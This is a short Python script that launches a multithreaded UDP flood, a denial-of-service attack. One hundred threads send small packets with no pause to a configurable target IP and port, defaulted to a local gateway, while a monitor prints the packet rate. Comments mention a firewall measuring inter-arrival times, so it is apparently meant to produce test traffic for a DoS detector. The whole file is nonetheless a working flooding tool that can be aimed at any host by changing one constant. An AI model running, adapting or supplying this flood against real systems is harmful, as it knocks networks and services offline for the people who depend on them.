import socket
import threading
import time
import sys

# 🎯 CONFIGURATION
TARGET_IP = "192.168.1.1"  # Your Gateway (Router)
TARGET_PORT = 80           # HTTP Port
THREAD_COUNT = 100         # Number of parallel attackers
PACKET_SIZE = 64           # Small packet (DoS signature)

# Global counter for stats
request_count = 0

def attack_worker(thread_id):
    global request_count
    
    # Create a standard UDP socket (Fastest way to generate traffic on Windows)
    # The Firewall captures ALL IP traffic, so UDP works just as well for IAT calculation.
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Random payload
    bytes_to_send = b"X" * PACKET_SIZE
    
    while True:
        try:
            # Fire and Forget (No Handshake needed)
            client.sendto(bytes_to_send, (TARGET_IP, TARGET_PORT))
            request_count += 1
            
            # NO SLEEP - Max Speed
            
        except Exception as e:
            # Sockets might get exhausted, just wait a tiny bit and retry
            time.sleep(0.01)

def start_monitor():
    """Prints speed stats every second"""
    global request_count
    start_time = time.time()
    
    while True:
        time.sleep(1)
        elapsed = time.time() - start_time
        
        if elapsed > 0:
            speed = request_count / elapsed
            print(f"    🔥 Current Speed: {speed:.0f} packets/sec | Total: {request_count}")

def main():
    print(f"\n[🚀] Launching THREADED FLOOD ({THREAD_COUNT} Threads) against {TARGET_IP}...")
    print("    Bypassing Windows Raw Socket restrictions...")
    
    # Start Monitor Thread
    threading.Thread(target=start_monitor, daemon=True).start()
    
    # Start Attack Threads
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=attack_worker, args=(i,), daemon=True)
        t.start()
        
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[🛑] Attack Stopped.")

if __name__ == "__main__":
    main()